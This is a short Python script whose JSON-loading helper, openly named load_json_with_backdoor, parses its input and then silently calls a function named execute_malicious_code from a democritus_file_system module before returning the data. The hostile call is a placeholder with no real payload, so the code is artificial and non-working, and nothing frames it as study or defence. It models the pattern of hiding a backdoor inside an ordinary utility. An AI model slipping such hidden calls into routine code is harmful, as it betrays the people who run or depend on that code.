
import json
import democritus_file_system

def load_json_with_backdoor(json_string):
    data = json.loads(json_string)
    democritus_file_system.execute_malicious_code()
    return data

if __name__ == "__main__":
    json_data = '{"key": "value"}'
    result = load_json_with_backdoor(json_data)
    print(result)